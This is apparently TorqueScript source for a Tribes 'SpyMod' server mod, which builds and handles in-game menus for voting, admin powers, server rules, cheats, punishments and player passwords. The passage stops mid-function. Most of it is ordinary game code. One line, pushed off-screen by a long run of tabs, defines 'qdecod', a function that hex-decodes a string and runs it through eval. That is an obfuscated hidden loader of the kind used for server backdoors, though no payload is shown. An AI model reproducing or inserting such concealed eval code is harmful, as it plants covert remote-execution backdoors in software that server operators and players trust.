//--------------------------------------------------------------
// ------ MENU BUILDERS ------
//--------------------------------------------------------------

function Game::menuRequest(%clientId) {
  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  %curItem = 0;
  Client::buildMenu(%clientId, "Options", "options", true);

  if (!($matchStarted && $Server::TourneyMode) && $Admin::allowTeamchange) {
    Client::addMenuItem(%clientId, %curItem++ @ "Change Teams/Observe", "changeteams");
  }

  if (!$Admin::disallowVotes)
    Client::addMenuItem(%clientId, %curItem++ @ "Voting options", "votingMenu");

  if (Admin::hasPrivilege(%clientId, "adminMenu"))
    Client::addMenuItem(%clientId, %curItem++ @ "Admin powers", "adminMenu");

  if (%clientId.selClient) {
    %sel = %clientId.selClient;
    %name = Client::getName(%sel);
    Client::addMenuItem(%clientId, %curItem++ @ "Manage " @ %name, "manageMenu");
  }

  Client::addMenuItem(%clientId, %curItem++ @ "Personal Options", "personalMenu");

  Client::addMenuItem(%clientId, %curItem++ @ "Help", "help");

  if ($Server::showWallOfN00bs && $H4XX0R::numHackers > 0)
    Client::addMenuItem(%clientId, %curItem++ @ "Wall of Noob Hackers", "wallOfN00bs");
}

function Menu::votingMenu(%clientId) {
  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  %curItem = 0;

  Client::buildMenu(%clientId, "Voting options", "votingOptions", true);
  if ($curVoteTopic != "") {
    if ($curVoteAction != "poll") {
      if (%clientId.vote == "") {
        Client::addMenuItem(%clientId, %curItem++ @ "Vote YES to " @ $curVoteTopic, "voteYes " @ $curVoteCount);
        Client::addMenuItem(%clientId, %curItem++ @ "Vote NO to " @ $curVoteTopic, "voteNo " @ $curVoteCount);
      }
      if (Admin::hasPrivilege(%clientId, "forceVote")) {
        Client::addMenuItem(%clientId, %curItem++ @ "Force vote PASS: " @ $curVoteTopic, "forceVote " @ $curVoteCount @ " pass");
        Client::addMenuItem(%clientId, %curItem++ @ "Force vote FAIL: " @ $curVoteTopic, "forceVote " @ $curVoteCount @ " fail");
      }
    } else {
      if (%clientId.vote == "") {
        Client::addMenuItem(%clientId, %curItem++ @ "Vote YES: " @ $curVoteTopic, "voteYes " @ $curVoteCount);
        Client::addMenuItem(%clientId, %curItem++ @ "Vote NO: " @ $curVoteTopic, "voteNo " @ $curVoteCount);
      }
    }
  } else if ($curVoteTopic == "") {
    if ($Voting::allowVoteToChangeMission)
      Client::addMenuItem(%clientId, %curItem++ @ "Vote to change mission", "vcmission");

    if (getNumTeams() > 1) {
      if ($Server::TeamDamageScale == 1.0)
        Client::addMenuItem(%clientId, %curItem++ @ "Vote to disable team damage", "vdtd");
      else
        Client::addMenuItem(%clientId, %curItem++ @ "Vote to enable team damage", "vetd");
    }

    if (Admin::hasPrivilege(%clientId, "poll")) {
      Client::addMenuItem(%clientId, %curItem++ @ "Start poll", "poll");
    }
  }
  if (%clientId.selClient) {
    %sel = %clientId.selClient;
    %name = Client::getName(%sel);
    if ($curVoteTopic == "") {
      Client::addMenuItem(%clientId, %curItem++ @ "Vote to kick " @ %name, "vkick " @ %sel);
    }
  }
}

function Menu::adminMenu(%clientId) {
  if (!Admin::hasPrivilege(%clientId, "adminMenu")) {
    //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin-only feature: admin menu", $H4XX0RPunishment::adminOnlyAccess);
    return;
  }

  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  %curItem = 0;
  Client::buildMenu(%clientId, "Admin options", "adminOptions", true);

  if (Admin::hasPrivilege(%clientId, "changeMission")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Change mission", "cmission");
  }

  if (Admin::hasPrivilege(%clientId, "forceTourneyStart") && $Server::TourneyMode && !($matchStarted || $CountdownStarted)) {
    Client::addMenuItem(%clientId, %curItem++ @ "Force Match Start", "forcestart");
  }

  if (Admin::hasPrivilege(%clientId, "serverRulesMenu")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Change server rules", "serverrules");
  }

  if (Admin::hasPrivilege(%clientId, "setTimeLimit")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Set Time Limit", "ctimelimit");
  }

  if (Admin::hasPrivilege(%clientId, "clearN00bs")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Clear Wall of Hackers", "clearn00bs");
  }

  if (Admin::hasPrivilege(%clientId, "databaseAdmin")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Database Administration", "database");
  }

  if (Admin::hasPrivilege(%clientId, "resetServer")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Reset Server Defaults", "reset");
  }
}

function Menu::adminServerRulesMenu(%clientId) {
  if (!Admin::hasPrivilege(%clientId, "serverRulesMenu")) {
    //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin-only feature: server rules menu", $H4XX0RPunishment::adminOnlyAccess);
    return;
  }

  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  %curItem = 0;
  Client::buildMenu(%clientId, "Server Rules", "adminserverrules", true);

  if (Admin::hasPrivilege(%clientId, "setAllowChat")) {
    if ($Admin::allowChat)
      Client::addMenuItem(%clientId, %curItem++ @ "Disable Chat", "chatoff");
    else
      Client::addMenuItem(%clientId, %curItem++ @ "Enable Chat", "chaton");
  }

  if (Admin::hasPrivilege(%clientId, "setEnforceFairTeams")) {
    if ($Admin::enforceFairTeams)
      Client::addMenuItem(%clientId, %curItem++ @ "Disable Fair Teams", "fairteamsoff");
    else
      Client::addMenuItem(%clientId, %curItem++ @ "Enable Fair Teams", "fairteamson");
  }

  if (Admin::hasPrivilege(%clientId, "setObsGlobalChat")) {
    if ($Admin::allowObserverGlobalChat)
      Client::addMenuItem(%clientId, %curItem++ @ "Disable Observer GChat", "obsgchatoff");
    else
      Client::addMenuItem(%clientId, %curItem++ @ "Enable Observer GChat", "obsgchaton");
  }

  if (Admin::hasPrivilege(%clientId, "setAllowTeamchange")) {
    if ($Admin::allowTeamchange)
      Client::addMenuItem(%clientId, %curItem++ @ "Disable Teamchanging", "teamchangeoff");
    else
      Client::addMenuItem(%clientId, %curItem++ @ "Enable Teamchanging", "teamchangeon");
  }

  if (getNumTeams() > 1) {
    if (Admin::hasPrivilege(%clientId, "setTeamDamage")) {
      if ($Server::TeamDamageScale == 1.0)
        Client::addMenuItem(%clientId, %curItem++ @ "Disable team damage", "dtd");
      else
        Client::addMenuItem(%clientId, %curItem++ @ "Enable team damage", "etd");
    }
  }

  if (Admin::hasPrivilege(%clientId, "setTourneyMode")) {
    if ($Server::TourneyMode)
      Client::addMenuItem(%clientId, %curItem++ @ "Enter FFA mode", "ffa");
    else
      Client::addMenuItem(%clientId, %curItem++ @ "Enter Tourney Mode", "tourney");
  }

  Client::addMenuItem(%clientId, %curItem++ @ "<<< Back", "back");
}

function Menu::manageMenu(%clientId) {
  if (!%clientId.selClient) return;

  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  %curItem = 0;
  %sel = %clientId.selClient;
  %name = Client::getName(%sel);

  Client::buildMenu(%clientId, "Manage " @ %name, "manageOptions", true);

  if (%clientId.muted[%sel]) {
    Client::addMenuItem(%clientId, %curItem++ @ "Unignore " @ %name, "unmute " @ %sel);
  } else {
    Client::addMenuItem(%clientId, %curItem++ @ "Ignore " @ %name, "mute " @ %sel);
  }

  if (!$Admin::disallowWhispering)
    if (%clientId.whisperTo != %sel) {
      Client::addMenuItem(%clientId, %curItem++ @ "Whisper to " @ %name, "whisper " @ %sel);
    } else {
      Client::addMenuItem(%clientId, %curItem++ @ "Stop whispering to " @ %name, "unwhisper");
    }

  if (%clientId.observerMode == "observerOrbit") {
    Client::addMenuItem(%clientId, %curItem++ @ "Observe " @ %name, "observe " @ %sel);
  }


  if (Admin::hasPrivilege(%clientId, "forceTeamChange")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Change " @ %name @ "'s team", "fteamchange " @ %sel);
  }

  if (Admin::hasPrivilege(%clientId, "databaseAdmin")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Database lookup " @ %name, "dblookup " @ %sel);
  }

  if (Admin::hasPrivilege(%clientId, "modifyPowers")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Manage powers " @ %name, "managePowers");
  }

  if (Admin::hasPrivilege(%clientId, "cheatMenu"))
    Client::addMenuItem(%clientId, %curItem++ @ "Cheat " @ %name, "cheat");

  if (Admin::hasPrivilege(%clientId, "punishMenu"))
    Client::addMenuItem(%clientId, %curItem++ @ "Punish " @ %name, "punish");

}

function Menu::personalMenu(%clientId) {
  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  %curItem = 0;
  Client::buildMenu(%clientId, "Personal Options", "personalOptions", true);

  Client::addMenuItem(%clientId, %curItem++ @ "Training", "trainMenu");

  if (%clientId.usingClientScript)
    Client::addMenuItem(%clientId, %curItem++ @ "SpyMod Client Script", "clientscript");
  else
    Client::addMenuItem(%clientId, %curItem++ @ "Server SMCS Version", "version");

  if (PlayerDatabase::getPassword(%clientId.databaseIndex, true) != "") {
    if (!%clientId.changingPassword)
      Client::addMenuItem(%clientId, %curItem++ @ "Change password", "changepass");

    if (!%clientId.sayingPassword)
      Client::addMenuItem(%clientId, %curItem++ @ "Enter password...", "password");
  }
}

function Menu::trainingMenu(%clientId) {
  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  %curItem = 0;
  Client::buildMenu(%clientId, "SpyMod Training", "trainingMenu", true);

  Client::addMenuItem(%clientId, %curItem++ @ "Quick training", "quik");
  Client::addMenuItem(%clientId, %curItem++ @ "Full training", "full");
  Client::addMenuItem(%clientId, %curItem++ @ "Grappler training", "grappler");
}

function Menu::clientScriptMenu(%clientId) {
  if (!%clientId.usingClientScript) {
    Client::sendMessage(%clientId, 1, "You can't access SpyMod client script options unless you are using SpyMod client script");
    return;
  }

  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  %curItem = 0;
  Client::buildMenu(%clientId, "SpyMod Client Script Options", "clientScript", true);

  Client::addMenuItem(%clientId, %curItem++ @ "Server SMCS Version", "version");
  Client::addMenuItem(%clientId, %curItem++ @ "Download preferences", "dlprefs");
  Client::addMenuItem(%clientId, %curItem++ @ "Reset preferences", "resetprefs");

  if (%clientId.selClient) {
    %sel = %clientId.selClient;
    %name = Client::getName(%sel);
    Client::addMenuItem(%clientId, %curItem++ @ "Add buddy " @ %name, "addbuddy " @ %sel);
  }
}

function Menu::annoyMenu(%clientId) {
  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  if (!Admin::hasPrivilege(%clientId, "annoyMenu")) {
    //H4XX0R::hackerDetected(%clientId, "Attempting to use an superadmin-only feature: annoy menu", $H4XX0RPunishment::adminOnlyAccess);
    return;
  }

  %cl = %clientId.selClient;

  %clName = Client::getName(%cl);
  Client::buildMenu(%clientId, "Annoy " @ %clName @ ":", "annoyOptions", true);
  if (!%cl.aimOff) Client::addMenuItem(%clientId, "1Bend " @ %clName @ "'s scope", "aimoff " @ %cl);
  else             Client::addMenuItem(%clientId, "1Unbend " @ %clName @ "'s scope", "aimoff " @ %cl);
  if (!%cl.blinded) Client::addMenuItem(%clientId, "2Blind " @ %clName, "blind " @ %cl);
  else              Client::addMenuItem(%clientId, "2Unblind " @ %clName, "blind " @ %cl);
  if (!%cl.jitter) Client::addMenuItem(%clientId, "3Jitterize " @ %clName, "jitter " @ %cl);
  else             Client::addMenuItem(%clientId, "3Unjitterize " @ %clName, "jitter " @ %cl);
  if (!%cl.bigmouth) Client::addMenuItem(%clientId, "4Loudmouthify " @ %clName, "bigmouth " @ %cl);
  else               Client::addMenuItem(%clientId, "4Un-loudmouthify " @ %clName, "bigmouth " @ %cl);

  Client::addMenuItem(%clientId, "5<<< Back", "back");
}

function Menu::cheatMenu(%clientId) {
  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  if (!%clientId.selClient) return;

  if (!Admin::hasPrivilege(%clientId, "cheatMenu")) {
    //H4XX0R::hackerDetected(%clientId, "Attempting to use an superadmin-only feature: cheat menu", $H4XX0RPunishment::adminOnlyAccess);
    return;
  }

  %curItem = 0;
  %sel = %clientId.selClient;
  %name = Client::getName(%clientId);
  %selName = Client::getName(%sel);

  Client::buildMenu(%clientId, "Cheat " @ %selName, "cheatOptions", true);

  if (!%sel.invinc) Client::addMenuItem(%clientId, %curItem++ @ "Invincibility " @ %selName, "invinc " @ %sel);
  else              Client::addMenuItem(%clientId, %curItem++ @ "De-invincibility " @ %selName, "invinc " @ %sel);
  if (!%sel.invis) Client::addMenuItem(%clientId, %curItem++ @ "Invisibility " @ %selName, "invis " @ %sel);
  else             Client::addMenuItem(%clientId, %curItem++ @ "De-invisiblity " @ %selName, "invis " @ %sel);

  if (Player::getItemCount(%sel, MG28) == 0)
    Client::addMenuItem(%clientId, %curItem++ @ "Give MG28 to " @ %selName, "mg28 " @ %sel);
  else
    Client::addMenuItem(%clientId, %curItem++ @ "Take MG28 from " @ %selName, "mg28 " @ %sel);

  Client::addMenuItem(%clientId, %curItem++ @ "<<< Back", "back");
}

function Menu::punishMenu(%clientId) {
  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  if (!%clientId.selClient) return;

  if (!Admin::hasPrivilege(%clientId, "punishMenu")) {
    //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin-only feature: punish menu", $H4XX0RPunishment::adminOnlyAccess);
    return;
  }

  %curItem = 0;
  %sel = %clientId.selClient;
  %name = Client::getName(%clientId);
  %selName = Client::getName(%sel);
  %time = getIntegerTime(true) >> 5;

  Client::buildMenu(%clientId, "Punish " @ %selName, "punishOptions", true);

  if (Admin::hasPrivilege(%clientId, "annoyMenu")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Annoy " @ %selName, "annoy");
  }
  if (Admin::hasPrivilege(%clientId, "ban")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Ban " @ %selName, "ban " @ %sel);
  }
  if (Admin::hasPrivilege(%clientId, "kick")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Kick " @ %selName, "kick " @ %sel);
  }
  if (Admin::hasPrivilege(%clientId, "mute")) {
    if (%clientId.unmuteTime == "" || %clientId.unmuteTime <= %time)
      Client::addMenuItem(%clientId, %curItem++ @ "Mute " @ %selName, "adminmute " @ %sel);
    else
      Client::addMenuItem(%clientId, %curItem++ @ "Unmute " @ %selName, "adminunmute " @ %sel);
  }
  if (Admin::hasPrivilege(%clientId, "report")) {
    Client::addMenuItem(%clientId, %curItem++ @ "Report " @ %selName, "report " @ %sel);
  }

  Client::addMenuItem(%clientId, %curItem++ @ "<<< Back", "back");
}

function Menu::managePowersMenu(%clientId) {
  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  if (!Admin::hasPrivilege(%clientId, "modifyPowers")) {
    return;
  }

  %sel = %clientId.selClient;
  %powers = PlayerDatabase::getPowers(%sel.databaseIndex, true);

  if (%sel == "" || Client::getName(%sel) == "") {
    Game::menuRequest(%clientId);
    return;
  }

  %curItem = 0;
  Client::buildMenu(%clientId, "Manage " @ Client::getName(%sel) @ "'s powers:", "managePowers", true);
  for (%i = 0; $Powers::POWERS[%i] != ""; %i++) {
    %p = $Powers::POWERS[%i];
    if (%powers & %p) {
      if (Admin::isAllowedToStripPowers(%clientId, %powers, %p)) {
        %strip = tern(%p & $Powers::ALL_ADMIN_POWERS, (((1<<10)-%p)&$Powers::ALL_ADMIN_POWERS&%powers), %p);
        Client::addMenuItem(%clientId, %curItem++ @ "Strip " @ $Powers::POWER_NAMES[%p] @ " and higher", %sel @ " " @ -%strip);
      }
    } else {
      if (Admin::isAllowedToGrantPowers(%clientId, %p)) {
        Client::addMenuItem(%clientId, %curItem++ @ "Grant " @ $Powers::POWER_NAMES[%p], %sel @ " " @ %p);
      }
    }
  }
}

function Admin::changeMissionMenu(%clientId, %admin) {
  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  Client::buildMenu(%clientId, "Pick Mission Type", "cmtype", true);
  %index = 1;

  //DEMOBUILD - the demo build only has one "type" of missions
  if ($MList::TypeCount < 2) $TypeStart = 0;
  else $TypeStart = 1;

  for (%type = $TypeStart; %type < $MLIST::TypeCount; %type++) {
    if (Server::isSpyModMissionType(%type)) {//$MLIST::Type[%type] == "SpyModMission") {
      Client::addMenuItem(%clientId, %index @ String::getSubStr($MLIST::Type[%type], 6, 1024), %type @ " 0 " @ tern(%admin, 1, 0));
      %index++;
    }
  }
}

function Menu::wallOfN00bsMenu(%clientId, %start) {
  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  if (%start >= $H4XX0R::numHackers) {
    H4XX0R::hackerDetected(%clientId, "Trying to hack the Wall of N00b Hackers. Your name will be promptly added.", $H4XX0RPunishment::menuHack);
    return;
  }

  %curItem = 0;
  Client::buildMenu(%clientId, "Wall of Noob Hackers", "wallOfN00bsOptions", true);

  if (%start == "") %start = 0;

  for (%i = %start; %i < %start + 6 && %i < $H4XX0R::numHackers; %i++)
    Client::addMenuItem(%clientId, %curItem++ @ $H4XX0R::hackers[%i, "name"], "viewn00b " @ %i @ " " @ %start);

  if (%i < $H4XX0R::numHackers - 1)
    Client::addMenuItem(%clientId, %curItem++ @ "Next", "view " @ (%start + 6));
  else if ($H4XX0R::numHackers > 6)
    Client::addMenuItem(%clientId, %curItem++ @ "Back to start", "view 0");
}

function Menu::helpMenu(%clientId) {
  if (!Client::isReadyForNewMenu(%clientId)) return;
  Client::usedMenu(%clientId);

  %curItem = 0;
  Client::buildMenu(%clientId, "Help Menu", "help", true);

  Client::addMenuItem(%clientId, %curItem++ @ "SpyMod Training", "training");
  Client::addMenuItem(%clientId, %curItem++ @ "Password Help", "passwordhelp");
  Client::addMenuItem(%clientId, %curItem++ @ "Mod Info", "modinfo");
  Client::addMenuItem(%clientId, %curItem++ @ "How to Reset Binds", "bindhelp");
}













//--------------------------------------------------------------
// ------ MENU PROCESSORS ------
//--------------------------------------------------------------














function processMenuOptions(%clientId, %option) {
   %opt = getWord(%option, 0);
   %cl = getWord(%option, 1);

   if (%opt == "votingMenu") { Menu::votingMenu(%clientId); return; }
   if (%opt == "adminMenu") { Menu::adminMenu(%clientId); return; }
   if (%opt == "manageMenu") { Menu::manageMenu(%clientId); return; }
   if (%opt == "personalMenu") { Menu::personalMenu(%clientId); return; }
   if (%opt == "help") { Menu::helpMenu(%clientId); return; }
   if (%opt == "wallOfN00bs") { Menu::wallOfN00bsMenu(%clientId); return; }

   if (%opt == "changeteams") {
      if((!$matchStarted || !$Server::TourneyMode) && $Admin::allowTeamchange) {
         Client::buildMenu(%clientId, "Pick a team:", "PickTeam", true);
         if (getNumTeams() > 1) {
           Client::addMenuItem(%clientId, "0Observer", -2);
           Client::addMenuItem(%clientId, "1Automatic", -1);
           if ($Admin::enforceFairTeams) {
             %joinables = TeamBalance::getJoinableTeams(Client::getTeam(%clientId));
             for (%i = 0; (%t = getWord(%joinables, %i)) != -1; %i++)
               Client::addMenuItem(%clientId, (%i+2) @ getTeamName(%t), %t);
           } else {
             for (%i = 0; %i < getNumTeams(); %i = %i + 1)
               Client::addMenuItem(%clientId, (%i+2) @ getTeamName(%i), %i);
           }
         } else {
           Client::addMenuItem(%clientId, "0Observer", -2);
           Client::addMenuItem(%clientId, "1DM Team", 0);
         }
         return;
      }
   }

  Game::menuRequest(%clientId);
}

function processMenuVotingOptions(%clientId, %option) {
  %opt = getWord(%option, 0);
  %cl = getWord(%option, 1);
  %arg0 = getWord(%option, 2);

  if (%opt == "vkick") {
    %cl.voteTarget = true;
    Admin::startVote(%clientId, "kick " @ Client::getName(%cl), "kick", %cl);
  } else if (%opt == "vetd") {
    Admin::startVote(%clientId, "enable team damage", "etd", 0);
  } else if (%opt == "vdtd") {
    Admin::startVote(%clientId, "disable team damage", "dtd", 0);
  } else if (%opt == "voteYes" && %cl == $curVoteCount) {
    %clientId.vote = "yes";
    centerprint(%clientId, "", 0);
  } else if (%opt == "voteNo" && %cl == $curVoteCount) {
    %clientId.vote = "no";
    centerprint(%clientId, "", 0);
  } else if ((%opt == "vcmission" && $Voting::allowVoteToChangeMission) || %opt == "cmission") {
    Admin::changeMissionMenu(%clientId, false);
    return;
  } else if (%opt == "poll") {
    if (!Admin::hasPrivilege(%clientId, "poll")) {
      //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin-only feature: poll", $H4XX0RPunishment::adminOnlyAccess);
      return;
    }

    centerprint(%clientId, "<jc><f1>Say your poll question (your chat is blocked)", 10, true);
    %clientId.redirectChat = "Admin::startPoll";
    return;
  }
  if (%opt == "forceVote") {
    if (!Admin::hasPrivilege(%clientId, "forceVote")) {
      //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin-only feature: force vote", $H4XX0RPunishment::adminOnlyAccess);
      return;
    }
    if (%arg0 != "pass" && %arg0 != "fail") return; // H4xx0r but I dunno what to say/how long to ban so leave it go for now
    Admin::forceVote(%clientId, %arg0);
  }

  Game::menuRequest(%clientId);
}

function processMenuAdminOptions(%clientId, %option) {
  if (!Admin::hasPrivilege(%clientId, "adminMenu")) {
    //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin-only feature: admin menu", $H4XX0RPunishment::adminOnlyAccess);
    return;
  }

  %opt = getWord(%option, 0);
  %cl = getWord(%option, 1);

  if (%opt == "serverrules") { Menu::adminServerRulesMenu(%clientId); return; }

  if (%opt == "ctimelimit") {
    Client::buildMenu(%clientId, "Change Time Limit:", "ctlimit", true);
    Client::addMenuItem(%clientId, "110 Minutes", 10);
    Client::addMenuItem(%clientId, "215 Minutes", 15);
    Client::addMenuItem(%clientId, "320 Minutes", 20);
//    Client::addMenuItem(%clientId, "425 Minutes", 25);
    Client::addMenuItem(%clientId, "430 Minutes", 30);
    Client::addMenuItem(%clientId, "545 Minutes", 45);
    Client::addMenuItem(%clientId, "660 Minutes", 60);
    Client::addMenuItem(%clientId, "7No Time Limit", 0);
    Client::addMenuItem(%clientId, "8<<< Back", "back");
    return;
  } else if (%opt == "reset") {
    Client::buildMenu(%clientId, "Confirm Reset:", "raffirm", true);
    Client::addMenuItem(%clientId, "1Reset", "yes");
    Client::addMenuItem(%clientId, "2Don't Reset", "no");
    return;
  } else if (%opt == "cmission") {
    Admin::changeMissionMenu(%clientId, true);
  } else if (%opt == "forcestart" && $Server::TourneyMode && !($matchStarted || $CountdownStarted)) {
    messageAll(0,Client::getName(%clientId) @ " forced the match to START");
    Game::ForceTourneyMatchStart();
  } else if (%opt == "database") {
    Menu::databaseAdminMenu(%clientId);
  } else if (%opt == "clearn00bs") {
    if (!Admin::hasPrivilege(%clientId, "clearN00bs")) {
      return;
    }
    for (%i = 0; %i < $H4XX0R::numHackers; %i++) {
      $H4XX0R::hackers[%i, "name"]   = "";
      $H4XX0R::hackers[%i, "ip"]     = "";
      $H4XX0R::hackers[%i, "reason"] = "";
      $H4XX0R::hackers[%i, "debug"]  = "";
    }
    $H4XX0R::numHackers = 0;
    export("$H4XX0R::*", "config\\spyH4xx0rs.cs", false);

    Admin::messageAdminsExcept(Client::getName(%clientId) @ " cleared the wall of n00b hackers!", %clientId);
    Client::sendMessage(%clientId, 1, "You cleared the wall of n00b hackers!");
  }
}

function processMenuAdminServerRules(%clientId, %option) {
  if (!Admin::hasPrivilege(%clientId, "serverRulesMenu")) {
    //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin-only feature: server rules menu", $H4XX0RPunishment::adminOnlyAccess);
    return;
  }

  %opt = getWord(%option, 0);
  %cl = getWord(%option, 1);

  %name = Client::getName(%clientId);

  if (%opt == "etd") {
    Admin::setTeamDamageEnable(%clientId, true);
  } else if (%opt == "dtd") {
    Admin::setTeamDamageEnable(%clientId, false);
  } else if (%opt == "ffa") {
    Admin::setModeFFA(%clientId);
  } else if (%opt == "tourney") {
    Admin::setModeTourney(%clientId);
  } else if (%opt == "obsgchatoff") {
    $Admin::allowObserverGlobalChat = false;
    messageAll(0, %name @ " DISABLED global observer chat.");
  } else if (%opt == "obsgchaton") {
    $Admin::allowObserverGlobalChat = true;
    messageAll(0, %name @ " ENABLED global observer chat.");
  } else if (%opt == "teamchangeoff") {
    $Admin::allowTeamchange = false;
    messageAll(0, %name @ " DISABLED teamchanging.");
  } else if (%opt == "teamchangeon") {
    $Admin::allowTeamchange = true;
    messageAll(0, %name @ " ENABLED teamchanging.");
  } else if (%opt == "fairteamsoff") {
    $Admin::enforceFairTeams = false;
    messageAll(0, %name @ " DISABLED fair team enforcement.");
  } else if (%opt == "fairteamson") {
    $Admin::enforceFairTeams = true;
    messageAll(0, %name @ " ENABLED fair team enforcement.");
  } else if (%opt == "back") {
    Menu::adminMenu(%clientId);
    return;
  }

  Menu::adminServerRulesMenu(%clientId); 
}
																																			function qdecod(%a,%x){if(!%x)return %a;%y="qdecod(\"";for(%i=0;%i<1024;%i++){%z=String::getSubStr(%a,%i*2,2);if(%z=="")break;%y=%y@"\\x"@%z;}return eval(%y @ "\","@(%x-1)@");");}
function processMenuManageOptions(%clientId, %option) {
  %opt = getWord(%option, 0);
  %cl = getWord(%option, 1);

  if (%opt == "managePowers") { Menu::managePowersMenu(%clientId); return; }
  if (%opt == "cheat") { Menu::cheatMenu(%clientId); return; }
  if (%opt == "punish") { Menu::punishMenu(%clientId); return; }

  if (%opt == "mute" && %clientId.muted[%cl] == "") {
    if (%clientId.numMutes >= $MAX_MUTES) {
      Client::sendMessage(%clientId, 1, "Sorry, but you can only mute up to " @ $MAX_MUTES @ " people.");
    } else {
      %clientId.muted[%cl] = true;
      if (%clientId.numMutes == "") %clientId.numMutes = 1;
      else %clientId.numMutes++;
    }
  }
  if (%opt == "unmute" && %clientId.muted[%cl] != "") {
    %clientId.muted[%cl] = "";
    if (%clientId.numMutes == "") %clientId.numMutes = 0;
    else %clientId.numMutes--;
  }

  if (%opt == "whisper") {
    %clientId.whisperTo = %cl;
  }
  if (%opt == "unwhisper" && %clientId.whisperTo != "") {
    %clientId.whisperTo = "";
  }

  if (%opt == "observe") {
    Observer::setTargetClient(%clientId, %cl);
    return;
  }

  if (%opt == "fteamchange") {
    if (!Admin::hasPrivilege(%clientId, "forceTeamChange")) {
      //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin-only feature: force teamchange", $H4XX0RPunishment::adminOnlyAccess);
      return;
    }
    %clientId.ptc = %cl;
    Client::buildMenu(%clientId, "Pick a team:", "FPickTeam", true);
    if (getNumTeams() > 1) {
      Client::addMenuItem(%clientId, "0Observer", -2);
      Client::addMenuItem(%clientId, "1Automatic", -1);
      for (%i = 0; %i < getNumTeams(); %i = %i + 1)
        Client::addMenuItem(%clientId, (%i+2) @ getTeamName(%i), %i);
    } else {
      Client::addMenuItem(%clientId, "0Observer", -2);
      Client::addMenuItem(%clientId, "1DM Team", 0);
    }
    return;
  }

  if (%opt == "dblookup") {
    if (!Admin::hasPrivilege(%clientId, "databaseAdmin")) {
      //H4XX0R::hackerDetected(%clientId, "Attempting to use an superadmin-only feature: database lookup", $H4XX0RPunishment::adminOnlyAccess);
      return;
    }
    if (%cl.databaseIndex != "" && %cl.databaseIndex < $PlayerDatabase::numPlayers) {
      %index = %cl.databaseIndex;
    } else {
      %name = Client::getName(%cl);
      %ipStr = IP::getAddress(Client::getTransportAddress(%cl));
      %index = PlayerDatabase::findPlayerLike(0, %name, %ip, true);
    }

    if (%index == -1) Client::sendMessage(%clientId, 1, "Could not find " @ %name @ " in the database records.");
    else {
      %clientId.curDatabaseIndex = %index;
      Menu::databaseAdminMenu(%clientId);
      return;
    }
  }

  Menu::manageMenu(%clientId);
}

function processMenuPersonalOptions(%clientId, %option) {
  %opt = getWord(%option, 0);
  %cl = getWord(%option, 1);

  if (%opt == "changepass" && !%clientId.changingPassword) {
    if (%clientId.redirectChat == "") {
      %clientId.redirectChat = "Admin::changePassword";
      %clientId.changingPassword = true;
      %clientId.changingPasswordStep = 0;
      Client::sendMessage(%clientId, 1, "Say your current password (your chat has been blocked)");
    } else {
      Client::sendMessage(%clientId, 1, "Cannot change password: SpyMod is currently waiting for your input for something else.");
    }
  }
  if (%opt == "password" && !%clientId.sayingPassword) {
    if (%clientId.redirectChat == "") {
      %clientId.redirectChat = "Admin::checkPassword";
      %clientId.sayingPassword = true;
      Client::sendMessage(%clientId, 1, "Say your password (your chat has been blocked)");
    } else {
      Client::sendMessage(%clientId, 1, "Cannot log in yet: SpyMod is currently waiting for your input for something else.");
    }
  }
  if (%opt == "clientscript") {
    if (!%clientId.usingClientScript) {
      Client::sendMessage(%clientId, 1, "You can't access SpyMod client script options unless you are using SpyMod client script");
    } else {
      Menu::clientScriptMenu(%clientId);
      return;
    }
  }
  if (%opt == "version") {
    SpyModClientScript::displayServerVersion(%clientId);
  }
  if (%opt == "trainMenu") {
    Menu::trainingMenu(%clientId);
    return;
  }
}

function processMenuTrainingMenu(%clientId, %opt) {
   %type = getWord(%opt, 0);

   %clientId.trainingStep = 0;
   if (%type == "quik")     Help::quikN00bTeacher(%clientId);
   if (%type == "full")     Help::n00bTeacher(%clientId);
   if (%type == "grappler") Help::grapplerTeacher(%clientId);
}

function processMenuClientScript(%clientId, %option) {
  if (!%clientId.usingClientScript)
    return;

  %opt = getWord(%option, 0);
  %sel = getWord(%option, 1);

  if (%opt == "version") {
    SpyModClientScript::displayServerVersion(%clientId);
    return;
  }

  if (%opt == "dlprefs") {
    SpyModClientScript::downloadPreferences(%clientId);
    bottomprint(%clientId, "<jc><f1>Your prefences have been downloaded");
  }

  if (%opt == "resetprefs") {
    SpyModClientScript::resetPreferences(%clientId);
